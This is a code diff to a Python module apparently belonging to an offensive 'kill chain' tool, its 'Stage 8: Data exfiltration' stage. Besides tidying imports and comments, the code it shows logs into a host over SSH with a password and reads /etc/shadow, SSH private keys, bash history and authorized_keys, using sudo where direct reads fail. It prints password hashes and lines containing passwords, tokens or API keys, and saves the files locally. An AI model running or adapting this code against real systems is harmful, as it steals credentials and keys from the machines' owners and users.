@@ -5,12 +5,7 @@ Stage 8: Data exfiltration.
 """
 
 import os
-import re
-import time
-import socket
 import shutil
-import subprocess
-import concurrent.futures
 
 try:
     import paramiko
@@ -18,7 +13,7 @@ except ImportError:
     paramiko = None
 
 try:
-    from config import CFG, find_wordlist, find_all_wordlists
+    from config import CFG, find_all_wordlists, find_wordlist
 except ImportError:
     CFG = {}
     def find_wordlist(cat): return ""
@@ -37,9 +32,7 @@ C_MAGENTA = "\033[95m"
 C_RESET  = "\033[0m"
 
 
-# ═══════════════════════════════════════════════
 # PARAMIKO SSH HELPERS (shared across stages)
-# ═══════════════════════════════════════════════
 
 
 def data_exfil(host: str, user: str, password: str, port: int = 22) -> str:
@@ -64,7 +57,7 @@ def data_exfil(host: str, user: str, password: str, port: int = 22) -> str:
     exfil_files = []
 
     try:
-        # v4.2: Check access level first
+        # Access level determines which collection paths are viable.
         whoami = _ssh_exec(client, "id", timeout=5)
         is_root = "uid=0" in whoami
         can_sudo = False
@@ -92,7 +85,7 @@ def data_exfil(host: str, user: str, password: str, port: int = 22) -> str:
             ("/root/.ssh/authorized_keys", "root_authorized_keys"),
         ]
 
-        # v4.2: User-home targets (always accessible)
+        # User-home targets do not require elevated access.
         user_home_targets = [
             (f"/home/{user}/.bash_history", f"{user}_history"),
             (f"/home/{user}/.ssh/id_rsa", f"{user}_ssh_key"),
@@ -137,7 +130,7 @@ def data_exfil(host: str, user: str, password: str, port: int = 22) -> str:
         for remote_path, local_name in targets:
             print(f"    {C_GREY}[→] {remote_path}...{C_RESET}", end="", flush=True)
 
-            # v4.2: Try direct read first, then sudo if non-root
+            # Try a direct read before falling back to sudo.
             content = _ssh_exec(client, f"cat {remote_path} 2>&1", timeout=10)
 
             # Check for actual failures and try sudo fallback
@@ -147,7 +140,7 @@ def data_exfil(host: str, user: str, password: str, port: int = 22) -> str:
                     if content and "Permission denied" not in content and "No such file" not in content and "[!]" not in content:
                         print(f" {C_GREEN}✓ {len(content)}B (via sudo){C_RESET}")
                     else:
-                        # v4.2: Show WHY it failed
+                        # Preserve the remote error as evidence.
                         reason = "permission denied" if "Permission denied" in str(content) else "not found"
                         print(f" {C_YELLOW}✗ ({reason}){C_RESET}")
                         output += f"[-] SKIPPED: {remote_path} — {reason}\n"
@@ -171,18 +164,18 @@ def data_exfil(host: str, user: str, password: str, port: int = 22) -> str:
 
             # Show interesting content inline
             if "shadow" in local_name and "root:" in content:
-                output += f"    Shadow hashes:\n"
+                output += "    Shadow hashes:\n"
                 for line in content.splitlines()[:10]:
                     if ":" in line and "$" in line:
                         parts = line.split(":")
                         output += f"      {parts[0]}: {parts[1][:40]}...\n"
                         print(f"      {C_RED}  {parts[0]}: {parts[1][:30]}...{C_RESET}")
             elif "PRIVATE KEY" in content:
-                output += f"    ← PRIVATE KEY CAPTURED\n"
+                output += "    ← PRIVATE KEY CAPTURED\n"
                 print(f"      {C_RED}  ← SSH PRIVATE KEY FOUND{C_RESET}")
             elif "DB_PASSWORD" in content or "password" in content.lower():
-                output += f"    ← CREDENTIALS in file\n"
-                # v4.2: Show actual password lines
+                output += "    ← CREDENTIALS in file\n"
+                # Preserve matching password lines as evidence.
                 for line in content.splitlines():
                     if any(kw in line.lower() for kw in ['password', 'passwd', 'secret', 'token', 'api_key', 'db_pass']):
                         print(f"      {C_RED}  {line.strip()[:100]}{C_RESET}")
@@ -220,9 +213,7 @@ def data_exfil(host: str, user: str, password: str, port: int = 22) -> str:
         total_size = sum(f["size"] for f in exfil_files)
         output += f"Total data: {total_size:,} bytes\n"
 
-        # Generate target report
-        # NOTE: _generate_target_report imported lazily inside data_exfil() to avoid
-        # circular import (orchestrator → exfil → orchestrator)
+        # Import lazily to avoid the orchestrator/exfil dependency cycle.
         from core.killchain.orchestrator import _generate_target_report
         _generate_target_report(host, user, exfil_dir, exfil_files, output)
 
@@ -230,10 +221,3 @@ def data_exfil(host: str, user: str, password: str, port: int = 22) -> str:
         client.close()
 
     return output
-
-
-# ═══════════════════════════════════════════════
-# FULL KILL CHAIN ORCHESTRATOR
-# ═══════════════════════════════════════════════
-
-
